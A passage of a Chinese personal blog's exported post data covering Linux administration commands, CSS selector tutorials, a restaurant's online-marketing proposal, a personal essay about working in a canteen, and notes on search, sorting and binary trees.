/home/abc abc -g root -m 删除用户 userdel 12userdel 用户名 #不会自动删除用户的主目录userdel 用户名 -r #会同时删除用户的主目录 给用户添加密码 passwd 12passwd 用户名passwd abc 查看用户登录情况 last 1sudo last 修改文件权限 chmod 字母法: chmod 修改权限 文件名 u 用户所有者 g 用户组 o 其他人 123+ 代表加权限- 代表减权限= 赋值权限 12345chmod u+x 1.c #给1.c文件添加所有者x执行权限chmod g-x 1.c #给1.c文件减去所属组x执行权限chmod o=rwx #给1.c文件赋予其他人rwx权限 数字法 123u g o0 0 0第一个数字0 对应着u权限 123456789rwx--- 000 代表没有权限r-- 100 4-w- 010 2--x 001 1rw- 110 6r-x 101 5-wx 011 3rwx 111 7 123chmod 777 1.c #代表1.c的权限是-rwx rwx rwxchmod 444 1.c #代表1.c的权限是-r--r--r-- 文件夹权限说明 目录没有x权限,表示不能进此目录 没有r权限,不能查看文件夹内容 没有w权限,不能新建或删除,修改文件 改变文件所有者 chown 12chown 用户名 文件或目录chown root aa 改变文件所属组 chgrp 12chgrp 用户组 文件或目录chgrp root aa 查看当前日历 cal 12calcal -y #查看一年的日历 显示或设置时间 date 1date 查看进程信息 ps 1ps -aux 可以不用加- -a显示所有进程,包括其他用户进程 -u显示进程的详细信息 -x 显示没有控制终端的进程 -w显示加宽,以便显示更多的详细 USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND USER 用户名 PID 进程ID %CPU 进程占用的CPU百分比 %MEM 占用内存的百分比 VSZ 该进程使用的虚拟內存量（KB） RSS 该进程占用的固定內存量（KB）（驻留中页的数量） TTY //该进程在哪个终端上运行，若与终端无关，则显示? 若为pts/0等，则表示由网络连接主机进程。 STAT 进程的状态 START 该进程被触发启动时间 TIME 该进程实际使用CPU运行的时间 COMMAND:所执行的指令 动态显示进程信息 top 1top 结束进程 kill 12kill 进程idkill -9 进程id #强制结束 后台运行 &amp;、jobs、fg 12345 ./hello.exe &amp; #表示后台运行 jobs #查看后台程序 fg 后台编号 #把后台程序调出前台 关机重启 reboot shutdown init 1234567reboot #重启shutdown -r now #重启shutdown -h now #立刻关机shutdown -h 20:25 #在20:25分关机shutdown -h +10 #十分钟后关机init 0 #关机init 6 #重启 字符界面和图像界面切换 redhat平台 12init 3 #字符界面init 5 #图形界面 Ubuntu快捷键切换 ctrl+alt+F2 字符界面 ctrl+alt+F1 图像界面 检测硬盘空间 df 1df -h 检查目录所占磁盘空间:du 1du -h 目录 -a 递归显示指定目录中各文件和子目录中文件占用的数据块 -s 显示指定文件和目录占用的数据块 -b 以字节为单位显示磁盘占用情况 -h人性化输出大小 安装软件 rpm rpm [选项][软件包名] -i指定安装的软件包 -h显示安装过程及进度 -v 显示安装的详细信息 -q查询系统是否已安装指定软件包 -a 查看系统已安装的软件包 -e 卸载软件 --nodeps 配合-e使用 ,强制卸载,不检查依赖项 --force 强制操作,如强制安装或卸载 1rpm -ihv ./aaa.rpm 获取最新的软件包的列表 1sudo apt-get update 从源中添加xxx软件 1sudo apt-get install xxx 删除xxx软件 1sudo apt-get remove xxx dpkg Debian Linux系统用来安装、创建和管理软件包的实用工具。 语法 dpkg(选项)(参数) 选项 -i：安装软件包； -r：删除软件包； -P：删除软件包的同时删除其配置文件； -L：显示于软件包关联的文件； -l：显示已安装软件包列表； --unpack：解开软件包； -c：显示软件包内文件列表； --confiugre：配置软件包。 参数 Deb软件包：指定要操作的.deb软件包。 实例 12345678910dpkg -i package.deb #安装包dpkg -r package #删除包dpkg -P package #删除包（包括配置文件）dpkg -L package #列出与该包关联的文件dpkg -l package #显示该包的版本dpkg --unpack package.deb #解开deb包的内容dpkg -S keyword #搜索所属的包内容dpkg -l #列出当前已安装的包dpkg -c package.deb #列出deb包的内容dpkg --configure package #配置包","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"属性选择器","slug":"html-css00022属性选择器","date":"2020-06-04T04:39:16.000Z","updated":"2020-06-04T04:56:52.137Z","comments":true,"path":"2020/06/04/html-css00022属性选择器/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/06/04/html-css00022属性选择器/","excerpt":"","text":"属性选择器 在HBuilder中按ctrl+shift+f可以折叠代码 title属性 可以给标签起一个标题名字 鼠标放上去会显示属性值 1&lt;p title=\"123\"&gt;zzz&lt;/p&gt; 元素名[属性名] 选择含有指定属性的元素 123456p[title]&#123;color: yellow;&#125;p[class]&#123;color: yellow;&#125; 元素名[属性名=属性值] 选择含有指定属性和属性值的元素 123456p[title=\"123\"]&#123;color: yellow;&#125;p[class=\"111\"]&#123;color: yellow;&#125; 元素名[属性名^=属性值] 选择属性值以指定值开头的元素 123456p[title^=\"a\"]&#123;color: yellow;&#125;p[class^=\"b\"]&#123;color: yellow;&#125; 元素名[属性名$=属性值] 选择属性值以指定值结尾的元素 123456p[title$=\"a\"]&#123;color: yellow;&#125;p[class$=\"b\"]&#123;color: yellow;&#125; 元素名[属性名*=属性值] 选择属性值中含有某值的元素的元素 123456p[title*=\"a\"]&#123;color: yellow;&#125;p[class*=\"b\"]&#123;color: yellow;&#125; 123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=\"text/css\"&gt; p[class]&#123; background-color: yellow; &#125; p[title=\"a\"]&#123; background-color: red; &#125; p[title^=\"ac\"]&#123; background-color: green; &#125; p[title$=\"bc\"]&#123; color: red; &#125; p[title*=\"z\"]&#123; color: brown; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;p title=\"acc\"&gt;123&lt;/p&gt; &lt;p title=\"acc\"&gt;123&lt;/p&gt; &lt;p title=\"abc\"&gt;123&lt;/p&gt; &lt;p title=\"abc\"&gt;123&lt;/p&gt; &lt;p title=\"a\"&gt;123&lt;/p&gt; &lt;p class=\"bc\"&gt;123&lt;/p&gt; &lt;p class=\"bc\"&gt;123&lt;/p&gt; &lt;p title=\"azs\"&gt;123&lt;/p&gt; &lt;p title=\"aza\"&gt;123&lt;/p&gt; &lt;p title=\"azc\"&gt;123&lt;/p&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"伪元素","slug":"html-css00021伪元素","date":"2020-06-04T04:12:31.000Z","updated":"2020-06-04T04:27:13.487Z","comments":true,"path":"2020/06/04/html-css00021伪元素/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/06/04/html-css00021伪元素/","excerpt":"","text":"伪元素 :first-letter 首字符伪元素 修改第一个字符的样式 12元素名:first-letter&#123;&#125; :first-line 首行伪元素 修改首行的样式 12元素名::first-line&#123;&#125; :before 表示元素最前面部分 :before和:after通常搭配content来使用 123p:before&#123;content: \"2133\";&#125; :after 表示元素最后面 123p:after&#123;content: \"2133\";&#125; 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;style&gt; p:first-letter&#123; color: red; font-size: 50px; &#125; p:first-line&#123; background-color: saddlebrown; &#125; p:before&#123; font-size: 50px; content: \"www\"; &#125; p:after&#123; font-size: 50px; content: \".com\"; color: green; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;12342112423141242&lt;/p&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"元素的伪类选择器","slug":"html-css00020元素的伪类选择器","date":"2020-05-30T11:43:22.000Z","updated":"2020-05-30T12:01:39.341Z","comments":true,"path":"2020/05/30/html-css00020元素的伪类选择器/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/05/30/html-css00020元素的伪类选择器/","excerpt":"","text":"元素的伪类选择器 伪类专门用来表示元素的一种特殊的状态. 比如访问过的超链接等 :link表示普通的链接（没访问过的超链接） 123a:link&#123;color:yellow;&#125; :visited表示访问过的超链接 浏览器是通过历史记录来判断一个链接是否访问过. 由于隐私的原因，所以visited这个伪类只能修改链接的颜色 123a:visited&#123;color:red;&#125; :hover表示鼠标移入的状态 123a:hover&#123;color:red;&#125; :active表示的是超链接被点击的状态. 123a:active&#123;color:red;&#125; :hover和:active也可以为其他元素设置 123456p:hover&#123;color:red;&#125;p:active&#123;color:red;&#125; IE6中,不支持对超链接以为的元素设置:hover和:active :focus获取焦点 123input:focus&#123;background-color:yellow;&#125; ::selection为p标签中选中的内容使用样式 可以用::selection伪类 注意:这个伪类在火狐浏览器中需要采用另外一种方式编写::-moz-selection 123456p::-moz-selection&#123;&#125;p::selection&#123;&#125;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"后代选择器和子元素选择器","slug":"html-css00019后代选择器和子元素选择器","date":"2020-05-30T09:52:56.000Z","updated":"2020-05-30T10:04:18.151Z","comments":true,"path":"2020/05/30/html-css00019后代选择器和子元素选择器/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/05/30/html-css00019后代选择器和子元素选择器/","excerpt":"","text":"后代选择器和子元素选择器 父元素 直接包含子元素的元素叫做父元素 子元素 直接被父元素包含的元素是子元素 祖先元素 ​ 直接或间接包含后代元素的元素叫做祖先元素 ​ 一个元素的父元素也是它的祖先元素 后代元素 ​ 直接或间接被祖先元素包含的元素叫做后代元素 ​ 子元素也是后代元素 兄弟元素 拥有相同父元素的元素是兄弟元素 后代元素选择器 作用：选中指定元素内的指定后代元素 语法： 12祖先 后代&#123;&#125; 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;style&gt; div span&#123; background-color: red; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; &lt;span&gt;我是div的后代&lt;/span&gt; &lt;p&gt;我也是div的后代&lt;/p&gt; &lt;p&gt;&lt;span&gt;我span也是div的后代&lt;/span&gt;&lt;/p&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 子元素选择器 ​ 作用：选中指定父元素的指定子元素 ​ 语法： 123父元素&gt;子元素&#123;&#125; 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;style&gt; div&gt;span&#123; background-color:red; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; &lt;span&gt;我是div的直接子元素&lt;/span&gt; &lt;p&gt;&lt;span&gt;我span不是div的直接子元素&lt;/span&gt;&lt;/p&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"关于MoTa利用互联网","slug":"关于摩打利用互联网的战略","date":"2020-05-09T15:02:07.000Z","updated":"2020-05-09T17:24:44.044Z","comments":true,"path":"2020/05/09/关于摩打利用互联网的战略/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/05/09/关于摩打利用互联网的战略/","excerpt":"","text":"关于MoTa利用互联网 摩打需要拥有自己的官方网站以及公众号 以下内容并非固化思维，可自行天马行空，增加或减少选项。 官方网站内容 用户信息 活动信息 最新消息 菜品展示 预定系统 支付系统 招聘信息 积分系统 会员系统 用户信息: 收集客户的姓名,电话,性别，生日 活动信息: 展示关于摩打新出的活动,吸引客户参与. 最新消息: 摩打有新出的菜式或与其相关的消息 菜品展示: 可以将摩打的所有菜品的图片都发布到网站，供客户参考并选择。 预定系统： 给客户提供预约服务，可提前一星期以内或更久的预定。 需要用户给出预定的时间，以及菜品。 需要用户给出定金或菜品全金。 如果用户到点未到，可根据情况作出部分退款 优势：客户到点就可马上就餐，缩短客户等待的时间 缺点：客户已预约且未到的情况，需要有一套方案去处理 支付系统： 可以在网站接如第三方平台的支付，如支付宝，微信，银联。 技术性要点： 支付成功：我们官方平台需要做些相应处理 招聘信息： 可在官方网站发布人才招聘信息。 积分系统： 假设用户累计到XXX分，可以赠送指定菜品或物品 积分衰减（可选）：如果用户在指定时间内（月或季度）未来本店消费，将衰退一定的积分。 积分可以是1元=1积分，或x元 = y积分（根据情况来定制） 会员系统： 每个新用户或老用户都可以免费成为新会员。 会员可分等级，等级越高，享受到的优惠越多。 等级可按照用户总消费金额上下浮度来决定。 会员系统与积分系统交互使用，既会员系统包含积分系统 会员等级可按照月或季度衰减或增加。 挽留老客户以及吸引新用户 挽留老用户： 先保证服务质量以及菜品质量 新鲜感 惊喜度 客户口味信息 天下没有吃不腻的食物，唯有吃不腻的创新，所以需要不断创新 感受度（如环境、温度等） 吸引新用户（可用于外卖）： 充分平台吸引： 可利用官方网站，公众号，淘宝，美团，饿了么等平台（最好是广州市区的，其他市区的也可，但这是伏笔）。 从老客户中挖掘新客户： 例如： 老客户介绍了一名新客户来本店消费，可以赠送折惠劵或现金劵、积分等奖励。 这需要有一套完整的电子系统支撑，以防止客户作弊 新用户被登记后便自动成为老用户，如上所述，老用户可介绍新用户 活动性吸引 写一篇关于介绍摩打的文章，散播到朋友圈，要求客户转发的文章点赞数量达到我们的要求，可赠送xxx菜品或礼物、优惠劵、积分等，每天需要限制人数，如前X名达到我们要求且先到达门店的客户才可享受前面所述的活动。达到点赞数目却不是最先前X名到达门店的可赠送某些物品或获得少量积分等。 限时或限数量抢购： 新出的菜品或xxx菜品打折,可限制时间或数量。 策划指定节假日活动 根据店面人员已经情况策划。 打折与免单活动（需要微信小程序支撑）： 活动要求： 在本店正在消费的客户 在规定的时间内，客户转发本店文章，并且该文章已让客户的朋友阅读数量达到xxx 限制免单名额和打折名额。如免单名额一天为X个，打折名额一天为Y个 每天公开前一天的免单名单以及打折名单（打消客户的质疑度，可建立一个当天所有用户的微信群，在群里发布消息，这样可以方便发布二次推广） 食品网站参考： 海底捞 https://www.haidilao.com/zh/gyhdl/index.html 肯德基 http://www.kfc.com.cn/kfccda/index.aspx 必胜客 http://www.pizzahut.com.cn/ 星巴克 https://www.starbucks.com.cn/ 网站开发渠道: 一般商家会根据你的要求提供一条龙技术服务的。 预估价格1k以内或1k~2k之间。 上面所述的可自行增加、删除与采纳、且所有的前提在于服务质量与菜品质量","categories":[],"tags":[]},{"title":"在某某食堂的经历","slug":"在某某食堂的经历","date":"2020-05-06T17:55:39.000Z","updated":"2020-05-11T18:35:42.887Z","comments":true,"path":"2020/05/07/在某某食堂的经历/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/05/07/在某某食堂的经历/","excerpt":"","text":"如果使用手机观看，在文章接近末尾时，请使用横屏阅读。以避免排版结构错误！ 事情的开始 原本打算2020年成立的工作室的，可造化弄人啊。千算万算，还是算漏了天灾。所以导致我们的工作室一直迟迟开不起来。就这样我在家里一直待到三月份才回广州，我自己意识到这个时候想进公司还是有点困难的，因为目前很多公司都裁员了，就连教育行业兄弟连公司也倒闭了。所以我只能先随便找一份工作让自己先生存下来。 回到广州的时候，广州还是属于一级防护，很多村子都封了，外地人基本都进不去。那时候可把我愁坏了，因为很多旅店都是要进村的，还好最后还是被自己混进去了，然后拿到某个村子的通行证。这也多亏了自己学过社会工程学。其实感觉很矛盾，就算拿到了一个村子的通行证，证明了自己是健康的，当去其他村的时候还是不能进。 在住旅店的这段时间找了很多工作，其实这些工作很多都是工厂和服务员的，没办法，我回来的时候还没有正式开始复工。我面试了很多工作，第一份是仓库管理的，后面因为某些原因就没去了。后面我朋友介绍了一份某某食堂服务员的工作给我，面试我的是一位叫小萱的小姐姐，那时候我们还是在线面试的，开视频的时候，就问了一些问题，之后就叫我们去办健康证了，再之后就是让我们去总部培训，培训的时候那叫一个精彩呀，满满的鸡汤和大饼（自己百度）。 入职的第一天 当我踏进某某食堂的第一步的时候，我觉得这里面的人都很好呀，特别是我们的店长，那个笑脸真的让人意外的感觉到亲切的感觉。 上岗的时候，楼面的李某某主管就安排了我补家私，然后家私没有补完就叫我去洗毛巾，洗完毛巾之后叫我去收桌，收桌之前一个叫啊西的经理和李某某主管一直强调说我们这里要的是效率，效率，效率，这时我心里那个叫惨呀。 其实我感觉日企文化的公司都很干净，我们收桌的时候要带黄色的一次性手套，而弄食材的时候必须带透明的手套，因为疫情期间嘛，这方面我感觉到了人性化，为员工着想的同时，也给顾客带来了健康。唯一的缺点是规矩真的很多，很多规矩都是很死板的，这也是我一直不想进入日企或日企文化公司的原因。没办法我还是来了。随后我发现，天啊，这里的桌是收不完的，从上班一直收到下班，我心里那个叫苦呀，可能是之前没有做好心理准备吧。随后又发现，每当遇见阿西的时候，她都会对我说加油哦。我心想，我会不会以后听到加油两个字都毛骨悚然呀。不过这里的正能量还是挺多的。感觉来到这里，就是再重温一遍学生会的感觉。比如见到人就要打招呼，哪怕是见到我们内部的员工也是要打招呼，发现某个员工的错误马上就指出来（这与其他职场完全不一样）有些地方是不会当面马上大声的指出来的，因为怕得罪人嘛。特别是在有管理层的人在旁边的时候，这样会让犯错误的那个同事很难堪的，表面上是不会怨恨，可背后呢？谁也不敢保证吧？这里也是对一个人情商的一个大考场地。 亮点 这里的服务与普通餐饮的行业相比，可以说是所向披靡的。 卫生方面在我所接触过的餐饮行业中也是数一数二的。 小伙伴累的时候，某些管理层会给小伙伴一罐红牛或者营养快线，这点心里还是会觉得自己的付出还是有被认可的。被认可不一定是给物质，还可以是精神上的认可。比如说xxx你今天表现得很棒哦！你今天的努力，我都有看到哦。 大部分小伙伴都很热情。 很多小伙伴都很上进,虽然 有些时候上进的方式缺少了情商的方式，但拥有上进的心就是一种正能量，能量是会传递的。 管理层的人都比较友善，没有一副高高在上的感觉，这点是我最欣赏的地方，因为现实中很少这样的管理者。 大波店长的笑容可以治愈每个人的心，每当不开心时，他的笑容都能让人觉得很欣慰。因为工作中总会积累到一些负面的情绪，可他这么一笑，所有的负面都烟消云散了，在职场上，一位领导对你的微笑意味着对你的认可，虽然不知道他的笑意是什么，但总要往好处想嘛。人们常说微笑是一种无穷大的能量，它可以让你战胜一切，所向披靡。 还有很多很多，我就先省略掉吧！ 缺陷 为什么这里的女生厕所要男生去洗，这对男员工心理不舒服的同时还给顾客带来不舒服。每次搞完厕所出来的时候，遇到哪些女顾客时，她们都会带着一种异样的眼光看着我们。难道某某食堂这里没有女生吗？我还记得有一次，我搞完厕所出来的时候，有一位女生很大声的说，“咦，女厕所居然有男生的”，这时候我心里贼尴尬呀。 这里的员工餐贼不公平，除了第一批吃的，其他批次吃时可能渣都没有了，更别说最后一批了。我提前半个小时公司了，发现菜和饭一点都不剩了，这还是人做的事情么？然后让我挨饿上班工作，还好一位叫鱼子酱的去熟食窗口那里打了一位饭并且反应给啊西经理让她让我去休息室吃。要不然我还真担心自己会饿晕在那里。 某位经理说我没有融入进这群伙伴里，其实我觉得这不是一个人的问题吧，毕竟一个巴掌是拍不响的。他们老员工不接纳我们这些新员工，我们不管做什么都融入不进去呀。 我发现这里收桌的人都是最低等最低贱的，恰好我就是那个收桌的。任何人都可以指挥我们这个岗位的人去做事，哪怕这些不在我们份内的事，还是要我们做。叫我们帮他们很容易，叫他们帮我们那个叫困难呀。 某位经理真的是用人千疑啊，有一天肚子不舒服，两个小时上了两次厕所，他居然说怎么你又上厕所，天天上厕所。我杀人的心都有了，怀疑人家偷懒就直说嘛。 停下来就是闲的。有一次忙得不可开交了，好不容易停下来站了一会，某位经理上来就直接说，你这么闲，去扫一下地。这时心里一万句cnm啊，我忙的时候，你的眼睛去哪里了？莫非是被卖冰棍的老太太当冰块串起来了？ 刚刚入职工作的第三天，没有人教我们看班表，直接就发一张图片过来，然后第二天就问我们为什么没上班 ，我们一脸懵逼呀。鬼知道那张图片是要来干嘛的？ 普通员工的事情，管理层的人不上心。最记得的是宿舍的WiFi永远都是马上就来装的，结果一天拖一天，一直拖了大半个月才装好。如果是这样，直接就说公司不装宿舍WiFi嘛。 管理层的意见没有统一化，比如收夜最后补家私的时候有些经理说全部要补进消毒柜，有些经理说只补筷子勺子，和酱油碟就可以了。这样我们听谁的？ 啊姨放家私的窗口永远都是有零碎的家私。 厨余垃圾的那个桶永远都是有生活垃圾的。只要收桌的人离开一会回来马上就能看到有生活垃圾了。然后我们每次都要伸手进厨余垃圾桶里捡起来，所以我们收桌的小伙伴还有另外一个称呼“捡垃圾的垃圾佬”。 有一次有一位小伙伴不小心把家私弄掉了，刚刚好砸在我头上，当时那个叫疼啊，然后某位经理就催我快点收桌，我都和他说了我被砸到头了，他还再催我去收桌，当时觉得超级憋屈呀。如果不是因为差不多到离职那天了，我绝对会当场发飙的。 下班搞卫生的时候，安排到我扫地，我就拿出手机来照着地上来扫，有个叫渣女就不断的讽刺，说哇你好认真哦，扫个地还用电筒照着。我都是打算要走的人了，是和你抢功劳呢？还是怕我和你竞争升职呢？我都一而再再而三的忍让她了，她还咄咄逼人，最后我还是爆发了，这是我来这某某食堂以来第一次发的脾气。说实话我本来就不容易发脾气的人，能把我逼到这种地步的人还真的是人才啊。 感觉这里的物料老是不足，例如 黄色手套，早几天前都说了手套快没了，还没用完了之后还没有买回来，然后不知道怎么突然又找到几包暂时能支撑着，谁知道他们还不会亡羊补牢，是不是每次都要等到危机来临的时候才去处理呢？这些是谁的责任呢？哪怕手套这些是采购买的，但管理层领导的工作是什么？带领好自己手下的同时是不是应该和其他部门交接好呀？ 有一次一位叫啊西的管理层领导叫我去女厕所搞卫生，搞完之后要拍照发在钉钉那个群上。刚刚好我搞完卫生拍好照走出去门口准备把照片发在钉钉上的时候，另外一位管理层的就马上说我玩手机了，根本就没有解释的机会，我只能说这个管理层领导也是个人才（蠢材）。 在我离职的那段时间，那些管理层的一直安排我收桌，收桌就算了。有一次整个场子就我一个收桌的，场子分三个区嘛，分别是ＡＢＣ区，Ａ区称为内场，因为内场一直很忙，收桌一直收个不停，吃宵夜的时候Ｃ区的小伙伴就开始抱怨我了，她说：我是不是得罪你了？为什么一直不过来Ｃ区收桌啊。这时我那个叫憋屈啊，我在内场忙得冒烟了，哪里还有时间去Ｃ区收桌啊！真的当我会分身啊？ E区真的很搞笑,每次下大雨都会淹水，这个问题其实也不是很复杂，既然不能改变建筑的结构，但可以软性的去解决问题。例如买些隔水的物品回来，如果每次下雨都让客人湿鞋或在水中进食，可想而知，这给客人的体验感是多差，这也是潜在的客户流失的存在。问题往往只有那么一两个，但解决问题的方法却可以有千万种。 最后的个人总结与感慨 上述的文字言语或许会比较偏激，这其中我自身也是有问题的，因为我缺乏在这里上进的动力，所以一直都很消沉。我的光芒也并没有在这里展现出来，因为这不是我的舞台。其实这里面大部分的同事都是蛮可爱的，还没有被尘世染化，正是他们的这份纯情的天真，才能勾起我曾在学生时代学生会的点点滴滴。可惜我不再是过往的那个我，而他们也不是我曾经的小伙伴。到最后我才发现最开始啊西总是对我喊的那句“加油哦！”并没有成为我心里最恐惧的话，而成为了我最难以忘怀的能量源泉。我知道自己是一个非常容易陷入感情却又难以自拔的人，所以我一直很抗拒自己的社交，所以这一次我狠下了心，并不想和他们有深入的交情。其实也挺矛盾的，明明不想成为这样的人，可却要伪装成这样的人，现在想想还是挺可笑的。我很清楚每个地方都会有矛盾、明中暗斗、误会等。但这并不影响他们的可爱。最后我还是没有留下点什么，悄然的离开了这个我最不喜欢也最不讨厌的地方。 假若有缘，我想我们还是不见了吧！ 祝愿你们前程似锦，面对困难不畏不惧。 记得要把微笑常挂在脸上哦！ 因为你们真的真的很可爱！ (*^o^)(^o^*) 最后我要对彩虹、小劳、西红柿、鱼子酱、文庆，博锐、肥龙、小弟，说声谢谢，你们身上各自的光芒，成功的留在了我的心里。当然不能忘记了我们的浩业大哥！大人物嘛总是要最后出场的。哈哈哈！","categories":[],"tags":[]},{"title":"算法","slug":"006算法","date":"2020-04-30T05:24:52.000Z","updated":"2022-05-30T16:04:53.979Z","comments":true,"path":"2020/04/30/006算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/30/006算法/","excerpt":"","text":"算法 查找与排序技术 顺序查找 顺序表又称为顺序搜索。 从表中的第一个元素开始比较，若相等则查找成功，若元素不存在，则查找失败。 当一个线性表的长度为n时，最坏情况下，查找一个元素需要比较n次 二分查找法 二分查找只适用于顺序存储的有序表。 步骤： 将x与线性表的中间元素进行比较： 若中间元素的值等于x，则说明查找成功，查找结束 若x小于中间元素的值，则在线性表的前半部分以相同的方法查找。 若x大于中间元素的值，则在线性表的后半部分以相同的方法查找。 这个过程一直进行到查找成功或子表长度为0（说明线性表中没有这个元素）为止。 最糟糕的情况需要查找log2n次。 交换类排序法 冒泡排序 通过相邻数据元素的交换逐步将线性表变成有序的。 从前往后，然后从后往前比较并交换元素。 最坏情况时要比较n(n - 1)/2 次，n代表线性表的长度。 快速排序 快速排序法是对冒泡排序法的改进，又叫作分区交换排序法。 基本思想如下： 从线性表中任意选取一个元素（通常选第一个元素），设为T，将线性表中小于T的元素移到T的前面，而大于T的元素移到T的后面，结果就将线性表分成了两部分（称为两个子表），T处于分界线的位置处，这个过程称为线性表的分割。通过对线性表的一次分割，就以T为分界线，将线性表分成了前后两个子表，且前面子表中的所有元素均不大于T，而后面子表中的所有元素均不小于T，然后用同样的方法对分割后的子表进行快速排序，直到各个子表的长度为1为止。 插入类排序法 简单插入排序法 简单插入排序法也叫直接插入排序法。 插入排序是指将无序序列中各元素依次插入到已经有序的线性表中。 希尔排序法 希尔排序法（Shell Sort）又称缩小增量排序法，它对简单插入排序做了比较大的改进。 其方法如下： 将整个无序序列分割成若干小的子序列分别进行简单插入排序。 时间复杂度: O（n1.5） 堆排序法 每个父节点同时大于等于两个子结点或每个父结点同时小于等于两个子结点的结构成为堆 时间复杂度: O（ nlog2n ） 考点总结 二分法查找只适用于顺序存储的线性表，且表中的元素必须按关键字有序（升序，但允许相邻元素值相等）排列； 在长度为n的有序线性表中进行二分查找其时间复杂度为O（ log2n ）。 交换类 冒泡排序：n(n-1)/2 快速排序：n(n-1)/2","categories":[{"name":"计算机公共基础","slug":"计算机公共基础","permalink":"https://xiaowuyoucy.github.io/categories/计算机公共基础/"}],"tags":[]},{"title":"树与二叉树","slug":"005树与二叉树","date":"2020-04-27T18:05:59.000Z","updated":"2020-04-27T19:31:29.546Z","comments":true,"path":"2020/04/28/005树与二叉树/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/28/005树与二叉树/","excerpt":"","text":"树与二叉树 树的基本概念 树（tree）是一种非线性结构。在树这种数据结构中，所有数据元素之间的关系具有明显的层次特点。 每一个结点只有一个前件，称为父结点。 没有前件的结点称为根节点。 每一个结点都可以有多个后件，它们都称为该结点的子结点。 没有后件的结点称为叶子结点。 一个结点所拥有的后件的个数称为该结点的度。 所有结点中的最大的度称为树的度 以某结点的一个子结点为根构成的树称为该结点的一棵子树。 叶子结点没有子树。 二叉树 二叉树的基本概念 二叉树的特点： 非空二叉树只有一个根结点 每一个结点最多有两棵子树，且分别称为该结点的左子树与右子树。 满二叉树与完全二叉树 满二叉树与完全二叉树是两种特殊的二叉树。 满二叉树 在一棵二叉树中，如果所有分支结点都存在左子树和右子树，并且所有叶子结点都在同一层上，这样的二叉树称为满二叉树。 完全二叉树 完全二叉树是指最后一层外，每一层上的结点数均达到最大值，而在最后一层上只缺少右边的若干结点。 满二叉树也是完全二叉树，而完全二叉树不一定是满二叉树 二叉树的基本性质 性质1：在二叉树中，第i层的结点数最多为2i-1个（i≥1） 性质2：在深度为k的二叉树中，结点总数最多为2k-1个（k≥1）。 性质3：对任意一棵二叉树，度为0的结点（既叶子结点）总是比度为2的结点多一个。 性质4： 具有n个结点的二叉树，其深度至少为[ log2n ] + 1，其中[log2n]表示取log2n的整数部分。 具有n个结点的完全二叉树的深度为[log2n]+1。 二叉树的存储结构 二叉树通常采用链式存储结构。 用于存储二叉树中各元素的存储结点。 由两部分组成：数据域与指针域。 二叉树遍历 按一定的次序访问二叉树中的每一个结点,使每个结点被访问一次且只被访问一次。 二叉树的遍历分为三种： 前序遍历 中序遍历 后序遍历 D，L，R D代表访问根结点 L代表遍历根节点的左子树 R代表遍历根节点的右子树 前序遍历：D L R 中序遍历：L D R 后序遍历：L R D 前序遍历(DLR) 先访问根节点，然后遍历左子树，最后遍历右子树；并且，在遍历左、右子树时，仍然先访问根结点，然后遍历左子树，最后遍历右子树。 前序遍历结果：ABDGCEHIF 中序遍历（LDR）： 首先遍历左子树，然后访问根节点，最后遍历右子树；并且，在遍历左、右子树时，仍然先遍历左子树，然后访问根结点，最后遍历右子树。 中序遍历结果:DGBAHEICF 后序遍历(LRD) 首先遍历左子树，然后遍历右子树，最后访问根节点；并且，在遍历左、右子树时，仍然先遍历左子树，然后遍历右子树，最后访问根结点。 后序遍历结果:GDBHIEFCA 考题 扇入代表前件 扇出代表后件","categories":[{"name":"计算机公共基础","slug":"计算机公共基础","permalink":"https://xiaowuyoucy.github.io/categories/计算机公共基础/"}],"tags":[]},{"title":"栈和队列","slug":"004栈和队列","date":"2020-04-25T03:17:47.000Z","updated":"2020-04-25T04:01:10.244Z","comments":true,"path":"2020/04/25/004栈和队列/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/25/004栈和队列/","excerpt":"","text":"栈和队列 栈及其基本运算 栈的基本概念 栈（stack）是限定仅在一端进行插入和删除运算的线性表。 在栈中，允许插入与删除的一端称为栈顶，而不允许插入与删除的另一端称为栈底。 栈的入口和出口是同一个口。 top=bottom=0的时候，说明栈是空的。 